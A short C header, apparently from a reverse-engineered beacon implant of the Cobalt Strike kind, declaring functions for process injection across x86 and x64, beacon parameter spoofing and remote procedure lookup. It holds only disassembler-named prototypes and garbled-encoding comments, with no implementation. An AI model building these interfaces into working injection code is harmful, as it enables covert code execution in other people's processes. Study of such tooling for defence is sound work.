#pragma once
#include "Global.h"

#ifdef _WIN64

//x64×¢Èëx86
BOOL sub_180012278(HANDLE hThread, DWORD BaseAddress, DWORD64 lpParameter);

//x64×¢Èëx64
BOOL sub_1800121EC(HANDLE hThread, DWORD64 BaseAddress, DWORD64 lpParameter);

BOOL sub_1800121D8(BeaconProcessInject* pBeaconProcessInject, DWORD64 BaseAddress, DWORD64 lpParameter);


int sub_10003444(PROCESS_INFORMATION* pInfo, BeaconParameterSpoofing* pBPS);

BOOL sub_10004FA1(
    int Remote,
    HANDLE hProcess,
    PVOID BaseAddress,
    LPVOID lpParameter,
    LPCSTR lpModuleName,
    LPCSTR lpProcName,
    int offset);


#else
BOOL sub_10005463(BeaconProcessInject* pBeaconProcessInject, char* BaseAddress, LPVOID lpParameter);

int sub_10003444(PROCESS_INFORMATION* pInfo, BeaconParameterSpoofing* pBPS);

BOOL sub_10004FA1(
    int Remote,
    HANDLE hProcess,
    PVOID BaseAddress,
    LPVOID lpParameter,
    LPCSTR lpModuleName,
    LPCSTR lpProcName,
    int offset);


#endif // _WIN64